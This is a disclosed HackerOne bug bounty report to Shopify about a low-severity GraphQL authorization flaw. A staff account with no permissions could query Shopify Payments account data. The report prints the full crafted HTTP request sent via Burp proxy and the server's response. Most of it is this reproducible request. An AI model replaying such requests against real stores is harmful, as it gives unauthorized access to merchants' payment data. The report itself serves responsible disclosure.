# Using GraphQL, STAFF with NO explicit permissions on Store can retrieve Shopify Payments Balance.

## Report Details
- **Report ID**: 417170
- **URL**: https://hackerone.com/reports/417170
- **State**: Closed
- **Severity**: low
- **Submitted**: 2018-10-01T20:34:12.427Z
- **Disclosed**: 2019-04-04T03:09:12.607Z

## Reporter
- **Username**: h13-
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
Hi,

I am reporting this because it looks like a authorization bug in GraphQL. A staff member having no explicit permissions on a Shopify Store may be able to  retrieve the Current balances in all currencies for the account for Shopify Payments.

__Steps__

1. STAFF account is created and assigned NO permissions on a Shop by Owner/Admin
2. STAFF then logs in to shop. Notice that STAFF is not having any access to menus/ HOME section.
{F353946}

3. Now STAFF triggers the below GraphQL request via a burp proxy.

```
POST /admin/api/graphql HTTP/1.1
Host: vir444.myshopify.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
content-type: application/json
x-shopify-web-force-proxy: 1
origin: https://vir444.myshopify.com
Content-Length: 2999
Cookies: [....]

{"operationName":"HomeIndex","variables":{"localTime":"22:59"},"query":"query HomeIndex($localTime: DateTime!) {\n  staffMember {\n    id\n    privateData {\n      activityFeed(first: 3) {\n        edges {\n          ...ActivityFeed\n          __typename\n        }\n        __typename\n      }\n      capital {\n        ... on HomeCapitalSummary {\n          ...CapitalFeature\n          __typename\n        }\n        __typename\n      }\n      greeting(clientDatetime: $localTime) {\n        body\n        heading\n        __typename\n      }\n      notifications {\n        ... on HomeNotification {\n          ...Notifications\n          __typename\n        }\n        __typename\n      }\n      onboarding {\n        ... on HomeOnboarding {\n          ...Onboarding\n          __typename\n        }\n        __typename\n      }\n      tasks {\n        ... on HomeTask {\n          ...OrderTasks\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  shop {\n    betaOnboarding: beta(name: \"home_onboarding_web\")\n    betaSlice: beta(name: \"home_slice\")\n    email\n    features {\n      storefront\n      __typename\n    }\n    id\n    shopifyPaymentsAccount {\n      balance {\n        ... on MoneyV2 {\n          ...Balance\n          __typename\n        }\n        __typename\n      }\n      payouts(first: 2, reverse: true) {\n        edges {\n          ... on ShopifyPaymentsPayoutEdge {\n            ...Payout\n            __typename\n          }\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment ActivityFeed on ActivityEdge {\n  cursor\n  node {\n    author\n    createdAt\n    messages\n    topic\n    attributed\n    __typename\n  }\n  __typename\n}\n\nfragment CapitalFeature on HomeCapitalSummary {\n  balanceProgress\n  balanceRemaining {\n    amount\n    currencyCode\n    __typename\n  }\n  paybackAmount {\n    amount\n    currencyCode\n    __typename\n  }\n  __typename\n}\n\nfragment Balance on MoneyV2 {\n  amount\n  currencyCode\n  __typename\n}\n\nfragment Payout on ShopifyPaymentsPayoutEdge {\n  node {\n    gross {\n      amount\n      currencyCode\n      __typename\n    }\n    id\n    issuedAt\n    status\n    __typename\n  }\n  __typename\n}\n\nfragment Onboarding on HomeOnboarding {\n  feedbackOptions\n  heading\n  tagName\n  tasks {\n    buttons {\n      text\n      url\n      __typename\n    }\n    completed\n    iconKey\n    image {\n      originalSrc\n      __typename\n    }\n    label\n    message\n    title\n    __typename\n  }\n  __typename\n}\n\nfragment OrderTasks on HomeTask {\n  badge {\n    status\n    title\n    __typename\n  }\n  handle\n  icon {\n    originalSrc\n    __typename\n  }\n  title\n  url\n  __typename\n}\n\nfragment Notifications on HomeNotification {\n  button {\n    text\n    url\n    __typename\n  }\n  dismissible\n  dismissMessage\n  id\n  message\n  severity\n  title\n  __typename\n}\n"}

```

Observer the response

```
{
    "data": {
        "shop": {
            "betaSlice": true, 
            "__typename": "Shop", 
            "features": {
                "__typename": "ShopFeatures", 
                "storefront": true
            }, 
            "shopifyPaymentsAccount": {
                "__typename": "ShopifyPaymentsAccount", 
                "payouts": {
                    "__typename": "ShopifyPaymentsPayoutConnection", 
                    "edges": []
                }, 
                "balance": []
            }, 
            "betaOnboarding": true, 
            "id": "gid://shopify/Shop/5282726001", 
            "email": "a@gmail.com"
        }, 
```
{F353947}

## Impact

There are 2 issues which I noticed here,

1. The response indicated that the store is using `shopifyPayments` as means of settling payouts between customers, merchants & store owners. This information should have been hidden since the STAFF running the GraphQL query had no `settings` permission assigned to his role. This means STAFF must ideally not know what is/are the payment providers which are applicable for the store.

2. The response indicates an array called `balances` which I think is the place holder to retrieve the Current balances in all currencies for the account used for Shopify Payments on the store. Since my store did not do any transactions, the array is left empty. I suspect that had there been any Shopify Payments transactions in store, the balance of those will be reflected back into the `balances` parameter in the above GraphQL response. I believe payments/billing related information must not be visible/displayed to the STAFF especially when he has `no- explicit` permission assigned on the store.

## Attachments
- s1.JPG
- s2.JPG
